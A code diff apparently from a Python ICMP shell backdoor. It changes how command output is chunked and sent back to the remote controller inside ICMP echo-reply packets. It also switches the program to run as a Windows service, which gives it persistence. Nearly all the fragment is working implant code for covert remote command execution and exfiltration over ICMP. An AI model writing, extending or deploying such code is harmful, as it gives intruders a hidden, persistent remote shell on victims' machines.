@@ -57,9 +57,12 @@ def packet_callback(packet):
         else:
             data_list = split_string_by_bytes(output, 200)
             data_list.append('\n')
-            reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
-            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + "\n")
-            send(reply_packets, verbose=False)
+            for p in data_list:
+                reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / p
+                send(reply_packet, verbose=False)
+            #reply_packets = [IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / data for data in data_list]
+            #reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + "\n")
+            #send(reply_packets, verbose=False)
 
 
 def ish_listen():
@@ -214,10 +217,10 @@ class Service(win32serviceutil.ServiceFramework):
 
 
 if __name__ == '__main__':
-    main()
-    #if len(sys.argv) == 1:
-    #    servicemanager.Initialize()
-    #    servicemanager.PrepareToHostSingle(Service)
-    #    servicemanager.StartServiceCtrlDispatcher()
-    #else:
-    #    win32serviceutil.HandleCommandLine(Service)
+    # main()
+    if len(sys.argv) == 1:
+        servicemanager.Initialize()
+        servicemanager.PrepareToHostSingle(Service)
+        servicemanager.StartServiceCtrlDispatcher()
+    else:
+        win32serviceutil.HandleCommandLine(Service)
